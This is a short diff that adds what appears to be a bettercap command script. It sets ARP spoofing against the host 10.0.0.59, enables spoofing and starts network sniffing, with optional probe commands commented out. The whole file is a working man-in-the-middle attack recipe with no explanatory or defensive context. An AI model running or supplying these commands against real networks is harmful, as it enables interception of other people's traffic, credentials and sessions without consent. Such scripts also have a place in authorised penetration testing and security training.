@@ -1,0 +1,7 @@
+#initial probe, optional
+#net.probe on
+#net.show
+#spoof arp and sniff
+set arp.spoof.targets 10.0.0.59
+arp.spoof on
+net.sniff on
